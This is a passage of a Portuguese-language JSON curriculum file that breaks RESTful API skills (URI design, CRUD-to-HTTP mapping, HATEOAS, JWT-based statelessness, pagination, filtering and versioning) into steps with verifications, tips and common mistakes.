                                "Hierarquia reflete relações de domínio sem aninhamento excessivo.",
                                "URIs são únicas, intuitivas e testáveis via HTTP.",
                                "Documentação inclui exemplos de uso."
                              ],
                              "assessmentCriteria": [
                                "Conformidade com convenções REST (90% das URIs corretas).",
                                "Intuitividade e legibilidade das URIs (fácil compreensão).",
                                "Uso apropriado de hierarquia vs query params.",
                                "Consistência em nomenclatura e formatação.",
                                "Cobertura completa de recursos do domínio.",
                                "Validação prática via simulação ou ferramenta."
                              ],
                              "crossCurricularConnections": [
                                "Banco de Dados: Mapeamento de URIs para consultas SQL/JPA.",
                                "Segurança: Autenticação em URIs sensíveis (/usuarios/{id}).",
                                "Desenvolvimento Front-end: Integração com fetch/axios.",
                                "Arquitetura de Software: Padrões de design RESTful.",
                                "Testes: Criação de testes unitários para endpoints."
                              ],
                              "realWorldApplication": "APIs como GitHub (/repos/{owner}/{repo}/issues), Twitter (/users/{id}/tweets) ou Stripe (/customers/{id}/charges) usam URIs hierárquicas para gerenciar recursos de forma escalável em aplicações globais."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.2.1"
                            ]
                          },
                          {
                            "id": "10.1.3.2.2.2",
                            "name": "Mapear operações CRUD aos métodos HTTP",
                            "description": "Associar GET (ler), POST (criar), PUT/PATCH (atualizar) e DELETE (remover) a recursos, garantindo idempotência onde aplicável e usando códigos de status apropriados como 200, 201, 404.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender as Operações CRUD Básicas",
                                  "subSteps": [
                                    "Defina Create (Criar): operação para adicionar novos registros ou recursos.",
                                    "Defina Read (Ler): operação para recuperar dados existentes sem alterá-los.",
                                    "Defina Update (Atualizar): operação para modificar dados existentes.",
                                    "Defina Delete (Remover): operação para eliminar recursos permanentemente.",
                                    "Identifique exemplos em um contexto de gerenciamento de usuários em um sistema."
                                  ],
                                  "verification": "Liste as 4 operações CRUD com uma breve definição e um exemplo cada, sem erros conceituais.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Documentação básica de CRUD (qualquer tutorial online)",
                                    "Bloco de notas para anotações"
                                  ],
                                  "tips": "Use acrônimo C.R.U.D. para memorizar a sequência lógica de operações em bancos de dados.",
                                  "learningObjective": "Dominar as definições fundamentais das operações CRUD e seu propósito em gerenciamento de dados.",
                                  "commonMistakes": [
                                    "Confundir Update com Create",
                                    "Pensar que Read altera dados"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar os Métodos HTTP Principais",
                                  "subSteps": [
                                    "Analise GET: método seguro e idempotente para leitura de recursos.",
                                    "Analise POST: método para criação de novos recursos, não idempotente.",
                                    "Analise PUT: método idempotente para atualização completa de um recurso.",
                                    "Analise PATCH: método para atualização parcial, idempotente em alguns casos.",
                                    "Analise DELETE: método idempotente para remoção de recursos.",
                                    "Compare características: segurança, idempotência e cacheabilidade."
                                  ],
                                  "verification": "Crie uma tabela comparativa dos 5 métodos com colunas para propósito, idempotência e segurança.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "RFC 7231 (HTTP/1.1 Semantics)",
                                    "Ferramenta como Postman para testes iniciais"
                                  ],
                                  "tips": "Lembre-se: métodos seguros (GET, HEAD, OPTIONS) não alteram estado do servidor.",
                                  "learningObjective": "Entender as propriedades únicas de cada método HTTP relevante para APIs RESTful.",
                                  "commonMistakes": [
                                    "Usar POST para leituras",
                                    "Ignorar que PUT substitui todo o recurso"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Operações CRUD aos Métodos HTTP",
                                  "subSteps": [
                                    "Mapeie Create → POST: envie dados no body para criar recurso, espere 201 Created.",
                                    "Mapeie Read → GET: use URI específica, retorne 200 OK ou 404 Not Found.",
                                    "Mapeie Update → PUT (completo) ou PATCH (parcial): especifique URI do recurso a atualizar.",
                                    "Mapeie Delete → DELETE: remova recurso na URI, retorne 204 No Content.",
                                    "Defina URIs padronizadas: coleções (/users) vs. instâncias (/users/{id})."
                                  ],
                                  "verification": "Desenhe um diagrama de mapeamento CRUD → HTTP com URIs de exemplo para um recurso 'produtos'.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Papel e caneta ou ferramenta de diagrama como Draw.io",
                                    "Exemplos de APIs RESTful (GitHub API docs)"
                                  ],
                                  "tips": "Sempre use substantivos em URIs (ex: /users, não /getUsers).",
                                  "learningObjective": "Estabelecer mapeamentos precisos entre CRUD e HTTP para design de APIs.",
                                  "commonMistakes": [
                                    "Mapear Update para POST",
                                    "Usar DELETE sem idempotência"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Conceitos de Idempotência e Códigos de Status",
                                  "subSteps": [
                                    "Defina idempotência: operação que produz o mesmo resultado se repetida.",
                                    "Identifique idempotentes: GET, PUT, DELETE (não POST).",
                                    "Selecione status codes: 200 OK (sucesso geral), 201 Created (POST), 204 No Content (DELETE), 404 Not Found.",
                                    "Teste idempotência: execute operações múltiplas e verifique resultados idênticos.",
                                    "Integre em fluxos: valide existência antes de UPDATE/DELETE."
                                  ],
                                  "verification": "Simule chamadas HTTP em Postman para um endpoint fictício e confirme status codes e idempotência.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Postman ou Insomnia para simular API",
                                    "Documentação de códigos HTTP (MDN ou HTTP Status Cats)"
                                  ],
                                  "tips": "Para PUT idempotente, sempre substitua o recurso inteiro para evitar estados parciais.",
                                  "learningObjective": "Incorporar idempotência e status codes apropriados em designs de API RESTful.",
                                  "commonMistakes": [
                                    "Usar 200 para criação (use 201)",
                                    "Achar POST idempotente"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie uma API para gerenciamento de tarefas: POST /tasks {title: 'Estudar'} → 201; GET /tasks/1 → 200 com tarefa; PUT /tasks/1 {title: 'Estudar API'} → 200; PATCH /tasks/1 {completed: true} → 200; DELETE /tasks/1 → 204. Teste idempotência repetindo PUT e DELETE sem mudanças extras.",
                              "finalVerifications": [
                                "Corretamente mapeie todas as 4 operações CRUD aos métodos HTTP apropriados.",
                                "Explique idempotência com exemplos para PUT vs. POST.",
                                "Liste pelo menos 5 códigos de status HTTP com contextos de uso.",
                                "Desenhe URIs corretas para coleções e instâncias de um recurso.",
                                "Demonstre um teste de idempotência em uma ferramenta como Postman.",
                                "Identifique quando usar PUT vs. PATCH."
                              ],
                              "assessmentCriteria": [
                                "Precisão no mapeamento CRUD-HTTP (100% correto).",
                                "Compreensão demonstrada de idempotência (explicação clara com exemplos).",
                                "Uso correto de pelo menos 4 status codes em cenários reais.",
                                "Qualidade das URIs: RESTful, hierárquicas e intuitivas.",
                                "Evidência de prática: screenshots ou logs de testes em ferramentas.",
                                "Identificação de erros comuns e como evitá-los."
                              ],
                              "crossCurricularConnections": [
                                "Banco de Dados: Mapeamento de queries SQL (INSERT→POST, SELECT→GET) para persistência.",
                                "Segurança da Informação: Aplicação de autenticação (JWT) e autorização por método HTTP.",
                                "Design de Software: Princípios RESTful e HATEOAS para URIs.",
                                "Desenvolvimento Front-end: Integração com fetch/axios para chamadas CRUD.",
                                "Redes: Compreensão de statelessness em APIs escaláveis."
                              ],
                              "realWorldApplication": "Em plataformas como e-commerce (Shopify: POST pedidos, GET produtos, DELETE itens do carrinho) ou redes sociais (Twitter: POST tweets, DELETE tweets), garantindo APIs robustas, escaláveis e previsíveis que suportam alto tráfego sem estados inconsistentes."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.2.1"
                            ]
                          },
                          {
                            "id": "10.1.3.2.2.3",
                            "name": "Implementar HATEOAS para interface uniforme",
                            "description": "Incorporar hyperlinks em respostas JSON (ex: HAL ou JSON-LD) para permitir navegação dinâmica pelos recursos, promovendo discoverability.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender conceitos de HATEOAS e selecionar formato de hypermedia",
                                  "subSteps": [
                                    "Estude o princípio HATEOAS e sua importância para APIs RESTful autodescritivas.",
                                    "Compare formatos como HAL, JSON-LD, Siren e Collection+JSON.",
                                    "Escolha HAL como formato padrão por sua simplicidade e suporte amplo.",
                                    "Analise exemplos de documentação oficial de HAL (ietf.org).",
                                    "Defina o escopo de hypermedia para sua API."
                                  ],
                                  "verification": "Crie um diagrama conceitual dos links necessários e justifique a escolha do formato em um documento.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação HAL (github.com/mikekelly/hal_specification)",
                                    "Artigo 'RESTful Hypermedia'"
                                  ],
                                  "tips": "Comece com HAL para protótipos rápidos; evite over-engineering em APIs simples.",
                                  "learningObjective": "Entender como HATEOAS promove discoverability e desacopla cliente do servidor.",
                                  "commonMistakes": [
                                    "Confundir HATEOAS com simples embeds; ignorar padrões de rel como 'self', 'next'."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Modelar recursos e definir relações de links (rels)",
                                  "subSteps": [
                                    "Identifique recursos principais da API (ex: users, orders).",
                                    "Mapeie relações possíveis: self, parent, child, next, prev, actions.",
                                    "Crie um blueprint de links para cada endpoint usando JSON HAL.",
                                    "Valide relações contra RFC 8288 (Web Linking).",
                                    "Documente o modelo em um arquivo YAML ou Markdown."
                                  ],
                                  "verification": "Gere um JSON de exemplo com _links para um recurso e valide com JSON Schema.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramenta HAL Browser (zalando.github.io/hal-browser)",
                                    "RFC 8288"
                                  ],
                                  "tips": "Use rels padronizados (IANA registry) para interoperabilidade máxima.",
                                  "learningObjective": "Modelar hiperlinks que permitam navegação dinâmica pelos recursos.",
                                  "commonMistakes": [
                                    "Definir URIs hard-coded; omitir 'self' link essencial."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar geração e inclusão de links no backend",
                                  "subSteps": [
                                    "Configure biblioteca HAL no framework (ex: Spring HATEOAS ou json-hal em Node.js).",
                                    "Crie um Resource Assembler para adicionar _links às entidades.",
                                    "Implemente lógica para links dinâmicos (ex: calcular 'next' baseado em paginação).",
                                    "Ajuste controllers para retornar Resource<T> em vez de DTOs crus.",
                                    "Teste unitariamente a serialização JSON."
                                  ],
                                  "verification": "Execute endpoint e confirme presença de _links no response via curl ou Postman.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Spring HATEOAS docs (spring.io/projects/spring-hateoas)",
                                    "Node.js halbuilder"
                                  ],
                                  "tips": "Use builders para links condicionais (ex: só mostrar 'edit' se autorizado).",
                                  "learningObjective": "Gerar respostas JSON com hyperlinks embedados de forma programática.",
                                  "commonMistakes": [
                                    "Links absolutos sem base URL; serialização circular em objetos relacionados."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar discoverability e interface uniforme",
                                  "subSteps": [
                                    "Use HAL Browser ou Postman para navegar via links sem conhecimento prévio de URIs.",
                                    "Teste cenários: paginação, ações CRUD via rels como 'create', 'update'.",
                                    "Valide conformidade com ferramentas como HAL Explorer.",
                                    "Simule cliente consumindo apenas _links para ações.",
                                    "Registre logs de navegação para análise."
                                  ],
                                  "verification": "Cliente fictício navega de /orders para /orders/1/author sem hardcode.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Postman Collection para HAL",
                                    "HAL Explorer (deserializeme.com)"
                                  ],
                                  "tips": "Foquem em 'follow only links' para simular cliente real.",
                                  "learningObjective": "Verificar que a API é fully discoverable e promove desacoplamento.",
                                  "commonMistakes": [
                                    "Ignorar Content-Type application/hal+json; testes manuais insuficientes."
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma API de e-commerce (/orders/123): { \"id\": 123, \"status\": \"shipped\", \"_links\": { \"self\": {\"href\": \"/orders/123\"}, \"customer\": {\"href\": \"/customers/456\"}, \"items\": {\"href\": \"/orders/123/items\"}, \"next\": {\"href\": \"/orders/124\"} } }. Cliente segue 'items' para listar produtos sem saber URI antecipadamente.",
                              "finalVerifications": [
                                "Respostas incluem _links com rels corretos e URIs absolutas.",
                                "Cliente navega dinamicamente por pelo menos 3 níveis de recursos.",
                                "Links são condicionais baseados em estado (ex: 'cancel' só se pendente).",
                                "Content-Type é application/hal+json.",
                                "Nenhuma URI hard-coded no cliente.",
                                "Paginacao funciona via 'next'/'prev'."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude dos links (rels IANA-compliant).",
                                "Dinamismo: links gerados runtime sem hardcode.",
                                "Cobertura: todos endpoints principais com self/next/etc.",
                                "Testes: 100% de navegação bem-sucedida via hypermedia.",
                                "Desempenho: overhead de links <10% no payload.",
                                "Documentação: blueprint HAL legível."
                              ],
                              "crossCurricularConnections": [
                                "Design de UX/UI: Navegação intuitiva similar a hyperlinks web.",
                                "Segurança da Informação: Links condicionais para controle de acesso.",
                                "Banco de Dados: Modelagem relacional para queries de links.",
                                "Desenvolvimento Ágil: Facilita evolução de API sem quebrar clientes."
                              ],
                              "realWorldApplication": "APIs como GitHub (/repos/{id} inclui links para issues, pulls), Stripe (payments com next_action links) e Twitter API usam HATEOAS para escalabilidade, permitindo clientes mobile/web evoluírem independentemente do backend."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.2.2.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.2.3",
                        "name": "Statelessness e Práticas de Escalabilidade",
                        "description": "Implementar APIs puramente stateless, gerenciando autenticação via tokens (JWT) e otimizações como paginação, compressão e versionamento para suportar alto tráfego.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.2.3.1",
                            "name": "Implementar statelessness com tokens JWT",
                            "description": "Gerar e validar tokens JWT em requisições HTTP, evitando sessões no servidor para permitir escalabilidade horizontal em múltiplas instâncias.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente e biblioteca JWT",
                                  "subSteps": [
                                    "Instale a biblioteca jsonwebtoken via npm: `npm install jsonwebtoken`.",
                                    "Crie uma chave secreta forte para assinar tokens (use dotenv para variáveis de ambiente).",
                                    "Configure um servidor Express básico com rotas de login e protegidas.",
                                    "Defina payloads padrão para tokens (userId, email, expiração).",
                                    "Teste importação da lib sem erros."
                                  ],
                                  "verification": "Verifique se `jwt.sign()` e `jwt.verify()` funcionam sem erros em um script de teste.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Node.js",
                                    "npm",
                                    "Express.js",
                                    "jsonwebtoken",
                                    ".env file"
                                  ],
                                  "tips": "Use chaves de pelo menos 256 bits para segurança; nunca hardcode em produção.",
                                  "learningObjective": "Entender instalação e configuração básica de JWT para autenticação stateless.",
                                  "commonMistakes": [
                                    "Usar chaves fracas ou expostas",
                                    "Esquecer de instalar dependências",
                                    "Não usar variáveis de ambiente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar geração de token JWT no login",
                                  "subSteps": [
                                    "Crie um endpoint POST /login que recebe credenciais (email/senha).",
                                    "Valide credenciais contra um banco mock ou real (use bcrypt para hash).",
                                    "Gere payload com userId, iat, exp (ex: 1h de validade).",
                                    "Assine token com `jwt.sign(payload, secret, options)`.",
                                    "Retorne token no response JSON."
                                  ],
                                  "verification": "Faça login via Postman e confirme que token é retornado com estrutura correta (header.payload.signature).",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Postman ou Insomnia",
                                    "bcrypt para hash de senhas",
                                    "Mock DB como JSON file"
                                  ],
                                  "tips": "Defina expiração curta para security; inclua iss e aud claims se necessário.",
                                  "learningObjective": "Dominar geração segura de tokens JWT com payloads personalizados.",
                                  "commonMistakes": [
                                    "Não validar credenciais antes de gerar token",
                                    "Exposição de senhas em logs",
                                    "Payloads com dados sensíveis"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar middleware para validação de JWT",
                                  "subSteps": [
                                    "Crie função middleware que extrai token do header Authorization (Bearer).",
                                    "Use `jwt.verify(token, secret)` para validar e decodificar payload.",
                                    "Anexe user data ao req (req.user = decoded).",
                                    "Trate erros: inválido (401), expirado (403), next() se OK.",
                                    "Registre logs para tentativas falhas."
                                  ],
                                  "verification": "Teste middleware isolado: envie token válido/inválido e cheque status codes.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Express middleware docs",
                                    "Logger como Winston"
                                  ],
                                  "tips": "Ignore query params para tokens; sempre use HTTPS em prod.",
                                  "learningObjective": "Implementar validação stateless sem armazenar sessões no servidor.",
                                  "commonMistakes": [
                                    "Não remover 'Bearer ' do token",
                                    "Não tratar jwt erros adequadamente",
                                    "Expor decoded payload inteiro"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Proteger rotas com middleware JWT",
                                  "subSteps": [
                                    "Aplique middleware a rotas privadas (ex: GET /profile, POST /orders).",
                                    "Crie grupo de rotas protegidas com app.use('/api/private', authMiddleware, router).",
                                    "Teste fluxo completo: login -> obter token -> acessar rota protegida.",
                                    "Simule múltiplas instâncias rodando em portas diferentes sem sessão compartilhada.",
                                    "Verifique escalabilidade: token funciona em qualquer instância."
                                  ],
                                  "verification": "Sem token: 401; Com token expirado: 403; Válido: 200 com dados user.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Múltiplas terminais para simular instâncias",
                                    "Docker para containers reais (opcional)"
                                  ],
                                  "tips": "Use PM2 ou Docker para testar horizontal scale; evite Redis para sessões.",
                                  "learningObjective": "Garantir statelessness permitindo deploy em múltiplas instâncias sem perda de auth.",
                                  "commonMistakes": [
                                    "Armazenar sessões acidentalmente",
                                    "Não testar cross-instâncias",
                                    "Rotas públicas protegidas por erro"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar segurança e otimizar",
                                  "subSteps": [
                                    "Teste ataques: token tampering, replay attacks com nonce/iat check.",
                                    "Implemente refresh tokens para sessões longas (novo endpoint /refresh).",
                                    "Monitore performance: decode sem overhead de DB.",
                                    "Adicione rate limiting em login para brute force.",
                                    "Documente uso do token no README."
                                  ],
                                  "verification": "Use jwt.io para debugar tokens; testes automatizados com Jest/Supertest passam.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "jwt.io debugger",
                                    "Jest + Supertest",
                                    "Rate limiter lib"
                                  ],
                                  "tips": "Refresh tokens com expiração mais longa, mas roteados via DB blacklist se revocados.",
                                  "learningObjective": "Aplicar melhores práticas de segurança em implantações stateless JWT.",
                                  "commonMistakes": [
                                    "Ignorar clock skew em verify",
                                    "Não revogar tokens comprometidos",
                                    "Overhead desnecessário"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma API de e-commerce com Express.js: usuário faz login em /auth/login, recebe JWT. Usa token para acessar /api/orders (protegida), permitindo checkout sem sessão no servidor. Rode 2 instâncias (porta 3000/3001), login em uma, checkout na outra – funciona perfeitamente.",
                              "finalVerifications": [
                                "Token gerado e decodificado corretamente sem DB lookup.",
                                "Requisições sem token retornam 401 Unauthorized.",
                                "Token expirado retorna 403 Forbidden.",
                                "Autenticação persiste em múltiplas instâncias do servidor.",
                                "Nenhum dado de sessão armazenado no servidor.",
                                "Payload não contém dados sensíveis e expira em 1h."
                              ],
                              "assessmentCriteria": [
                                "Código modular com middleware reutilizável (80%+ cobertura teste).",
                                "Segurança: chaves seguras, erros tratados, HTTPS ready.",
                                "Performance: validação <10ms, sem DB por request.",
                                "Escalabilidade demonstrada em simulação multi-instância.",
                                "Documentação clara de uso e erros comuns.",
                                "Tratamento robusto de edge cases (token inválido/malformado)."
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: Criptografia assimétrica e OAuth2 flows.",
                                "Arquitetura de Software: Microservices e containerização (Docker/K8s).",
                                "Banco de Dados: Integração com NoSQL para refresh token blacklist.",
                                "Cloud Computing: Deploy serverless (AWS Lambda) com API Gateway auth.",
                                "Testes de Software: Automação com unit/integration tests."
                              ],
                              "realWorldApplication": "Plataformas como Netflix e Spotify usam JWT para auth stateless em bilhões de requests diários, escalando horizontalmente sem sessões centralizadas, reduzindo latência e custos em CDNs globais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.2.1"
                            ]
                          },
                          {
                            "id": "10.1.3.2.3.2",
                            "name": "Aplicar paginação e filtros em respostas",
                            "description": "Usar query parameters como ?page=1&limit=10&filter=status=ativo para limitar resultados, evitando sobrecarga em endpoints de listas grandes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos de Paginação e Filtros em APIs RESTful",
                                  "subSteps": [
                                    "Estude o problema de sobrecarga em endpoints de listas grandes, como retornar 10.000 registros de uma vez.",
                                    "Aprenda query parameters padrão: page (número da página), limit/size (itens por página), filter (chave=valor para filtros).",
                                    "Revise statelessness: cada requisição deve ser independente, sem estado no servidor.",
                                    "Analise exemplos de APIs reais como GitHub (?page=1&per_page=10) ou Twitter.",
                                    "Documente offsets e limites matemáticos: offset = (page - 1) * limit."
                                  ],
                                  "verification": "Resuma em um diagrama ou nota os parâmetros e fórmulas, confirmando compreensão sem erros.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação RESTful (MDN ou Postman guides)",
                                    "Exemplos de APIs públicas (GitHub API docs)"
                                  ],
                                  "tips": "Use ferramentas como Postman para testar queries reais antes de codificar.",
                                  "learningObjective": "Explicar como paginação e filtros melhoram escalabilidade e UX em APIs stateless.",
                                  "commonMistakes": [
                                    "Confundir page com offset diretamente",
                                    "Ignorar tratamento de page=0 ou limit inválido"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Paginação Básica em um Endpoint",
                                  "subSteps": [
                                    "Crie um endpoint de lista simples (ex: GET /users) em Node.js/Express ou similar.",
                                    "Extraia query params page e limit do request (padrão: page=1, limit=10).",
                                    "Calcule offset = (page - 1) * limit e aplique na query do banco (ex: SQL LIMIT offset, limit).",
                                    "Retorne JSON com dados paginados e metadados: {data: [...], total: 100, page: 1, limit: 10, pages: 10}.",
                                    "Adicione validação: page e limit como inteiros positivos, limite máximo de 100."
                                  ],
                                  "verification": "Teste com ?page=1&limit=5 e ?page=2&limit=5; verifique se retorna itens corretos sem duplicatas.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Node.js/Express",
                                    "Banco de dados de teste (SQLite ou MongoDB)",
                                    "Postman para testes"
                                  ],
                                  "tips": "Sempre inclua metadados para o frontend calcular navegação.",
                                  "learningObjective": "Construir um endpoint paginado que evita sobrecarga e suporta navegação.",
                                  "commonMistakes": [
                                    "Não validar inputs (page negativo)",
                                    "Esquecer metadados de paginação"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Adicionar Suporte a Filtros Dinâmicos",
                                  "subSteps": [
                                    "Estenda o endpoint para aceitar ?filter=status=ativo ou ?filter=cidade=sao_paulo.",
                                    "Parse filtros do query string em um objeto (ex: {status: 'ativo'}).",
                                    "Construa query dinâmica no banco: WHERE status = ? AND cidade = ? com prepared statements.",
                                    "Combine com paginação: aplique filtros primeiro, depois pagine resultados filtrados.",
                                    "Suporte múltiplos filtros e operadores simples (ex: filter=idade>18 via query param custom).",
                                    "Retorne contagem total filtrada nos metadados."
                                  ],
                                  "verification": "Teste ?filter=status=ativo&page=1&limit=5; confirme que total reflete apenas filtrados.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Código do Step 2",
                                    "Biblioteca ORM como Sequelize ou Mongoose para queries seguras"
                                  ],
                                  "tips": "Use URLSearchParams para parsing robusto de queries complexas.",
                                  "learningObjective": "Implementar filtros que reduzem dados transferidos e melhoram performance.",
                                  "commonMistakes": [
                                    "SQL injection em filtros não sanitizados",
                                    "Paginando antes de filtrar"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, Otimizar e Documentar a Implementação",
                                  "subSteps": [
                                    "Escreva testes unitários para cenários: paginação vazia, filtros inválidos, grandes datasets.",
                                    "Meça performance com ferramentas como Apache Bench (ab -n 1000 URL).",
                                    "Otimize índices no banco para colunas filtradas/paginadas.",
                                    "Crie documentação OpenAPI/Swagger com exemplos de queries.",
                                    "Integre cache (ex: Redis) para queries paginadas comuns.",
                                    "Teste edge cases: page muito alta, limit=0, filtros inexistentes."
                                  ],
                                  "verification": "Todos testes passam (95% coverage) e performance < 200ms para 1M registros.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Jest/Mocha para testes",
                                    "Swagger Editor",
                                    "Ferramentas de benchmark (Apache Bench)"
                                  ],
                                  "tips": "Índices compostos aceleram WHERE + ORDER BY + LIMIT.",
                                  "learningObjective": "Garantir robustez, performance e usabilidade da API paginada e filtrada.",
                                  "commonMistakes": [
                                    "Ignorar ordenação padrão (adicione ?sort=id desc)",
                                    "Sem cache para queries repetidas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma API de e-commerce (GET /produtos?page=2&limit=20&filter=categoria=eletronicos&preco>100), retorna 20 produtos da página 2 filtrados, com metadados para navegação infinita no app mobile.",
                              "finalVerifications": [
                                "Endpoint responde corretamente com paginação e filtros combinados sem erros 500.",
                                "Metadados incluem total filtrado, pages totais e current page.",
                                "Performance mantém <500ms mesmo com 100k+ registros simulados.",
                                "Validações rejeitam page=-1 ou filter malformado com 400 Bad Request.",
                                "Testes automatizados cobrem 90% dos cenários, incluindo edge cases.",
                                "Documentação gerada permite uso imediato por frontend devs."
                              ],
                              "assessmentCriteria": [
                                "Precisão na implementação de offset/limit sem vazamentos de dados.",
                                "Segurança contra injeções em filtros dinâmicos.",
                                "Eficiência em escalabilidade: suporta datasets grandes sem timeout.",
                                "Usabilidade: metadados completos e erros HTTP apropriados.",
                                "Manutenibilidade: código limpo com validação e testes.",
                                "Flexibilidade: suporta múltiplos filtros e paginação customizável."
                              ],
                              "crossCurricularConnections": [
                                "Banco de Dados: Otimização de queries com índices e prepared statements.",
                                "Frontend: Integração com bibliotecas como React Query para infinite scroll.",
                                "Segurança: Sanitização de inputs e rate limiting em endpoints listados.",
                                "DevOps: Monitoramento de performance com Prometheus/Grafana.",
                                "UX Design: Melhorar carregamento progressivo em apps web/mobile."
                              ],
                              "realWorldApplication": "Em plataformas como Netflix (paginação de filmes por gênero), Mercado Livre (filtros de produtos por preço/local) ou LinkedIn (busca de vagas com paginação), reduzindo latência e custos de banda em APIs de alto tráfego."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.2.2.1"
                            ]
                          },
                          {
                            "id": "10.1.3.2.3.3",
                            "name": "Versionar APIs RESTful",
                            "description": "Implementar versionamento via URI (/v1/usuarios) ou cabeçalhos Accept, garantindo compatibilidade retroativa em evoluções da API.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender conceitos fundamentais de versionamento de APIs RESTful",
                                  "subSteps": [
                                    "Estude os princípios de versionamento em APIs REST, focando em compatibilidade retroativa.",
                                    "Analise métodos comuns: URI path (/v1/resource), headers (Accept: application/vnd.api.v1+json) e query params.",
                                    "Compare prós e contras de cada método, priorizando URI e headers.",
                                    "Revise exemplos de APIs reais como GitHub ou Stripe.",
                                    "Documente escolhas para o projeto, justificando URI ou headers."
                                  ],
                                  "verification": "Criar um resumo escrito com tabela comparativa de métodos e decisão para o projeto.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Documentação RESTful oficial (fielding thesis)",
                                    "Artigos Medium/Dev.to sobre API versioning",
                                    "Exemplos de APIs públicas (Postman collections)"
                                  ],
                                  "tips": "Sempre priorize a não quebra de clientes existentes; pense em 'graceful degradation'.",
                                  "learningObjective": "Dominar os métodos de versionamento e critérios de escolha para manter escalabilidade.",
                                  "commonMistakes": "Confundir versionamento de API com versionamento de código fonte (Git); ignorar impacto em clientes legados."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar versionamento via URI path",
                                  "subSteps": [
                                    "Defina estrutura de rotas: /v1/usuarios e /v2/usuarios no framework (ex: Express.js ou Spring Boot).",
                                    "Crie controllers ou handlers separados para cada versão.",
                                    "Garanta que v1 retorne apenas campos originais, sem novos campos de v2.",
                                    "Implemente lógica compartilhada via services para evitar duplicação de código.",
                                    "Configure roteamento para mapear /usuarios para /v1/usuarios por default."
                                  ],
                                  "verification": "Executar requests para /v1/usuarios e /v2/usuarios e validar respostas diferenciadas via Postman.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Framework backend (Node.js/Express, Java/Spring)",
                                    "Editor de código (VS Code)",
                                    "Ferramenta de teste API (Postman/Insomnia)"
                                  ],
                                  "tips": "Use namespaces ou módulos para isolar versões e facilitar manutenção futura.",
                                  "learningObjective": "Configurar rotas versionadas garantindo isolamento e reutilização de lógica de negócio.",
                                  "commonMistakes": "Expor campos novos em v1 acidentalmente; não tratar erros 404 para versões inexistentes."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar versionamento via header Accept",
                                  "subSteps": [
                                    "Configure middleware para ler header Accept: application/vnd.suaapi.v1+json ou v2+json.",
                                    "Mapeie header para lógica de versão no controller único (/usuarios).",
                                    "Implemente condicionais baseadas na versão detectada, retornando payloads adequados.",
                                    "Defina Content-Type correspondente na resposta.",
                                    "Adicione suporte fallback para default v1 se header ausente."
                                  ],
                                  "verification": "Testar com curl ou Postman usando diferentes Accept headers e validar payloads versionados.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Mesmos do step 2",
                                    "Documentação MIME types customizados",
                                    "Ferramentas curl/Postman para headers custom"
                                  ]
                                },
